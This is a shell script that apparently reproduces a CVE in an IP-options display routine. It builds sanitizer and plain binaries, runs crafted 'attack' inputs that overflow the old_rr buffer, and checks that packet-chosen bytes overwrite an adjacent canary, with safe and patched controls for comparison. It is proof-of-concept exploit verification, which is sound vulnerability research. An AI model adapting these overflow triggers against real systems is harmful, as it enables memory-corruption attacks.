#!/bin/sh
# Reproducible CVE-2026-136131 harness: ASan, plain adjacency, fixed and safe controls.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p asan plain fixed evidence

CC=${CC:-gcc}
BASE="-O0 -g -std=gnu99 -Wall -Wno-unused"
PINNED_SHA=e8ef2dd63b3f7b5e5d87d14a50bdc64c6befc94a8e21801f060708f2dcbb5e7b
n=0
rm -f evidence/.failed
pass() { n=$((n+1)); printf 'PASS %02d: %s\n' "$n" "$1"; }
fail() { n=$((n+1)); printf 'FAIL %02d: %s\n' "$n" "$1"; : > evidence/.failed; }

# 1. Pinned bytes are exactly upstream master 3547c769.
sha=$(sha256sum pinned/display_ipopt.c | cut -d' ' -f1)
[ "$sha" = "$PINNED_SHA" ] && pass "pinned display_ipopt.c sha256 $sha" || fail "pinned sha256 $sha"

# 2. Local fix patch applies to the verbatim pinned source.
patch -s -o fixed/display_ipopt.c pinned/display_ipopt.c < pinned/fix.patch >/dev/null 2>&1 &&
[ -f fixed/display_ipopt.c ] &&
cp pinned/display_ipopt.c standin/display_ipopt.c &&
cp fixed/display_ipopt.c standin/fixed_display_ipopt.c &&
pass "fix.patch applied; verbatim copies staged under standin/" || fail "fix.patch did not apply"
# Quoted includes resolve to the source file's own directory first, so the
# verbatim pinned sources are compiled from standin/ (identical bytes).
$CC $BASE -fsanitize=address -I standin -c standin/display_ipopt.c -o asan/display_ipopt.o &&
$CC $BASE -fsanitize=address -I standin -c standin/harness.c -o asan/harness.o &&
$CC -fsanitize=address -o asan/harness asan/display_ipopt.o asan/harness.o &&
$CC $BASE -fsanitize=address -I standin -c standin/fixed_display_ipopt.c -o asan/display_ipopt_fixed.o &&
$CC -fsanitize=address -o asan/harness_fixed asan/display_ipopt_fixed.o asan/harness.o &&
pass "ASan binaries built (vulnerable + fixed)" || fail "ASan build"

# 4. Compile the plain build, measure old_rr -> canary distance, rebuild with it.
$CC $BASE -I standin -c standin/display_ipopt.c -o plain/display_ipopt.o &&
$CC $BASE -I standin -c standin/harness.c -o plain/harness.o &&
$CC -o plain/harness plain/display_ipopt.o plain/harness.o &&
gap=$(nm -n plain/harness | awk '$3 ~ /^old_rr/ {o=strtonum("0x"$1)} $3=="canary" {c=strtonum("0x"$1)} END{print c-o}') &&
case "$gap" in ''|*[!0-9]*) gap=40;; esac &&
$CC $BASE -I standin -DCANARY_GAP=$gap -c standin/harness.c -o plain/harness.o &&
$CC -o plain/harness plain/display_ipopt.o plain/harness.o &&
[ "$gap" -ge 40 ] && [ "$gap" -le 480 ] &&
pass "plain build: old_rr@$(nm -n plain/harness | awk '$3 ~ /^old_rr/ {print $1}') canary@$(nm -n plain/harness | awk '$3=="canary" {print $1}') gap=$gap" ||
fail "plain build adjacency measurement (gap=${gap:-none})"

# 5. ASan: crafted RR option with pointer 0x48 (i=68) -> global write past old_rr[40].
asan/harness attack > evidence/asan-attack.out 2>&1; rc=$?
if [ "$rc" -ne 0 ] && grep -q 'global-buffer-overflow' evidence/asan-attack.out &&
   grep -q 'WRITE of size 68' evidence/asan-attack.out &&
   grep -q 'old_rr' evidence/asan-attack.out; then
	pass "ASan attack 0x48: rc=$rc, global-buffer-overflow WRITE-68 past old_rr"
else
	fail "ASan attack 0x48: rc=$rc, expected global WRITE-68 (see evidence/asan-attack.out)"
fi

# 6. ASan: second chosen pointer 0x5a (i=86).
asan/harness attack2 > evidence/asan-attack2.out 2>&1; rc=$?
if [ "$rc" -ne 0 ] && grep -q 'global-buffer-overflow' evidence/asan-attack2.out &&
   grep -q 'WRITE of size 86' evidence/asan-attack2.out; then
	pass "ASan attack 0x5a: rc=$rc, global-buffer-overflow WRITE-86"
else
	fail "ASan attack 0x5a: rc=$rc, expected global WRITE-86"
fi

# 7. Safe controls: in-bounds copy (i=4) and skipped copy (i=0) stay clean.
asan/harness safe > evidence/asan-safe.out 2>&1; rc=$?
if [ "$rc" -eq 0 ] && ! grep -q 'ERROR: AddressSanitizer' evidence/asan-safe.out; then
	pass "ASan safe i=4: rc=0, clean"
else
	fail "ASan safe i=4: rc=$rc"
fi
asan/harness safe-zero > evidence/asan-safe-zero.out 2>&1; rc=$?
if [ "$rc" -eq 0 ] && ! grep -q 'ERROR: AddressSanitizer' evidence/asan-safe-zero.out; then
	pass "ASan safe-zero i=0: rc=0, clean"
else
	fail "ASan safe-zero i=0: rc=$rc"
fi

# 8. Fixed source: same crafted option, no overflow.
asan/harness_fixed attack > evidence/fixed-asan-attack.out 2>&1; rc=$?
if [ "$rc" -eq 0 ] && ! grep -q 'ERROR: AddressSanitizer' evidence/fixed-asan-attack.out; then
	pass "ASan fixed attack: rc=0, clean"
else
	fail "ASan fixed attack: rc=$rc"
fi

# 9. Plain build: chosen bytes land in the adjacent canary at chosen offsets.
for mode in attack attack2; do
	plain/harness "$mode" > "evidence/plain-$mode.out" 2>&1; rc=$?
	can=$(grep '^CANARY:' "evidence/plain-$mode.out" | cut -d' ' -f2-)
	exp=$(grep '^EXPECT:' "evidence/plain-$mode.out" | cut -d' ' -f2-)
	if [ "$rc" -eq 0 ] && [ -n "$can" ] && [ "$can" = "$exp" ] &&
	   [ "$(printf '%s' "$can" | tr -d ' 0')" != "" ] &&
	   grep -q 'CANARY_GAP=' "evidence/plain-$mode.out"; then
		pass "plain $mode: rc=0, non-zero packet-derived bytes land in adjacent canary and match EXPECT"
	else
		fail "plain $mode: rc=$rc, canary/expect mismatch"
	fi
done
plain/harness safe > evidence/plain-safe.out 2>&1; rc=$?
if [ "$rc" -eq 0 ] && grep -q '^CANARY: 00 00 00 00 00 00 00 00' evidence/plain-safe.out; then
	pass "plain safe: rc=0, adjacent canary untouched"
else
	fail "plain safe: rc=$rc, canary not clean"
fi

printf 'SUMMARY: %s checks run\n' "$n"
if [ -f evidence/.failed ]; then exit 1; fi
exit 0
